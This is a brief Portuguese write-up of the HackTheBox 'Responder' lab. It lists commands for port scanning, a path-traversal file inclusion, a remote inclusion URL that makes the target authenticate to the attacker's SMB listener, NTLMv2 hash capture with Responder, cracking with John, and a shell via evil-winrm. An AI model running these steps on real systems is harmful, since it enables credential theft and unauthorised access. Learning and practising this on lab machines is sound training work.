Responder

HackTheBox, Very Easy

Responder explora uma inclusão de arquivo (LFI/RFI) em uma aplicação PHP para forçar o servidor Windows a autenticar contra uma máquina controlada pelo atacante, capturando um hash NTLMv2 que, após quebra, dá acesso via WinRM.

Reconhecimento

O Nmap revela HTTP (80) e WinRM (5985). Adiciona-se o domínio unika.htb ao /etc/hosts.

nmap -p- --min-rate 1000 -sV <IP>
echo "<IP> unika.htb" | sudo tee -a /etc/hosts

LFI → RFI

O parâmetro page é vulnerável a inclusão de arquivos. Confirma-se o LFI e, em seguida, testa-se a inclusão remota (RFI) apontando para o host do atacante.

http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts
http://unika.htb/index.php?page=//<MEU_IP>/somefile

Captura do hash com Responder

Inicia-se o Responder na interface do VPN para escutar requisições SMB. O RFI aponta para o compartilhamento do atacante e o servidor tenta autenticar, revelando um hash NTLMv2 do Administrator.

sudo responder -I tun0
http://unika.htb/index.php?page=//<MEU_IP>/whatever
# [SMB] NTLMv2-SSP Hash : Administrator::RESPONDER:<HASH_NTLMv2_OMITIDO>

Quebra e acesso

O hash é salvo e quebrado offline com o John (rockyou). Com a senha recuperada, o evil-winrm entrega uma shell e a flag é lida.

john -w=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i <IP> -u administrator -p '<SENHA>'
type C:\Users\mike\Desktop\flag.txt
